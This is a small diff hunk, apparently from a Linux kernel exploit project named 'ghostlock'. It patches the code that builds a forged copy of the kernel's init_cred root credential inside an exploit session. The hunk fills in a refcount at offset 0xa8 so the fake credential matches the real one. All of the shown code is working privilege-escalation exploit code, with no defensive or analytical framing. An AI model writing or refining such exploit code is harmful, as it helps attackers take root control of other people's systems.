@@ -225,6 +225,10 @@ namespace ghostlock::support {
             put64(c, ref_offsets[i],
                   session::g_exploit_session.addresses.data_alias(ref_images[i]));
         }
+        /* Faithful copy of this kernel's init_cred tail: the word at 0xa8 holds
+         * a small refcount (2 in the image dump). Leaving it zero made the copy
+         * diverge from the real credential. */
+        if (v->credential.copy_size > 0xa8) put64(c, 0xa8, 2);
         return 1;
     }
 
